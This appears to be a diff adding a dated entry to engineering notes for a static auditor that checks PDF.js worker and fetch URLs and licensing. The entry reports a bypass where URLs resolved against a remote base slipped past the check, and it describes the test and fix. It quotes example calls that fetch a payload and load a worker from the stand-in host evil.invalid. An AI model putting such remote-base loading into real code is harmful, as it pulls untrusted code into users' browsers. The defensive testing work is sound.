@@ -57,3 +57,33 @@
 **Bounded fix:** `scripts/audit-pdf-engine-provenance-369.ts` now evaluates only statically determined string literals, concatenations, direct `new URL(...)` wrappers and lexical `const` bindings in the existing TypeScript AST. It checks every `importScripts` argument, member-call fetch/importScripts, worker constructor URL, and assigned PDF.js `workerSrc`; refuses parse-broken source, MuPDF imports and explicit incompatible commercial-use restrictions in root/component license notices. A further isolated RED proved that browser-normalized leading spaces before `https:` and executable static `blob:` Worker references also passed; both now fail closed. The project dependency range is limited to reviewed `6.4.299` or `^6.4.299` and, if the npm lock root declaration is present, it must agree with the manifest. A sparse synthetic npm lock root remains explicitly marked `NOT VERIFIED` in audit limitations; production lock root was present and checked. The auditor does **not** claim to trace runtime-computed URLs, authenticated upstream tarballs, transitive license clearance, production network silence or legal permission.
 
 **Measured GREEN:** `./node_modules/.bin/vitest run tests/audit-pdf-engine-provenance-369.test.ts tests/audit-pdf-engine-provenance-369-20261013.test.ts --reporter=dot` **22/22 PASS**, covering all baseline RED examples, both subsequent normalized-URL/`blob:` RED cases, allowed local relative worker/URL and mutable reassignment, plus the old 8. Targeted `tsc --ignoreConfig --noEmit --pretty false --skipLibCheck --target es2022 --module esnext --moduleResolution bundler --types node scripts/audit-pdf-engine-provenance-369.ts tests/audit-pdf-engine-provenance-369-20261013.test.ts` **PASS**. Whole-repo `tsc --noEmit` separately failed due unrelated concurrent `scripts/forensic-redaction-378.ts:130` TS1005 parse error; it is not included in the #369 patch. Actual `tsx scripts/audit-pdf-engine-provenance-369.ts` **exit 0**, inspected 60 source/vendor files, independently parsed **2 pages / `alpha beta`**, and returned `NO_ADOPT_NO_GOLD` with MuPDF `AGPL_OR_COMMERCIAL_UNAPPROVED`. Original AC-369.1–3 **remain OPEN**, physical bundle/mobile, rights and dynamic CSP gates still NOT_RUN. Sole integrator owns Git/PR/push/merge.
+
+## 2026-10-13 — independent static remote-base URL bypass, scoped correction (worker-20; OPEN)
+
+**Independent P2:** Draft PR #27 source at `f04d4ce991ba339d9ec9168a0e1fd6e5a564f373`
+considered `fetch(new URL("./payload.wasm", "https://evil.invalid/pdf/"))`,
+`new Worker(new URL("./pdf.worker.mjs", "https://evil.invalid/pdf/"))`,
+and equivalent constant-bound bases as local, even though JavaScript's real URL
+constructor resolves each to a remote HTTPS address. Actual
+`inspectPdfEngineProvenance369` on independently isolated copies of installed
+PDF.js 6.4.299 returned `remoteCount:0` for these sources. A separate scan of
+the installed repository source found 57 first-party and three vendor JS/TS
+files totaling 4,786,222 bytes (largest first-party 63,778 bytes); this
+specific source corpus did not exhibit a source-size limit failure.
+
+**RED → GREEN:** NEW
+`tests/audit-pdf-engine-provenance-369-20261013-remote-base.test.ts` uses actual
+copied installed assets plus an isolated first-party AST source, proves four
+remote relative/base expressions incorrectly passed before the fix (**4 RED,
+1 benign local PASS**), and now requires `PDF369_NO_GO` for remote `fetch` and
+`Worker` both directly and through lexical constant bindings. In
+`scripts/audit-pdf-engine-provenance-369.ts`, the bounded `new URL` static
+evaluator resolves a known relative address against an independently known
+literal/constant base via the platform's `URL` implementation. Legitimate
+`new URL("./pdf.worker.mjs", import.meta.url)` and ordinary local paths stay
+allowed. A runtime-computed/unknown base is outside this source-only AST audit
+and remains an expressly documented limitation, not a claimed exhaustive
+network/CSP gate. No vendor, dependency, rollout, code consumer or license
+decision changed. Original AC-369.1–3 remain **OPEN** and adoption remains
+**NO_ADOPT_NO_GOLD** pending independent legal/transitive-rights, source,
+feature/bundle and physical mobile proof.
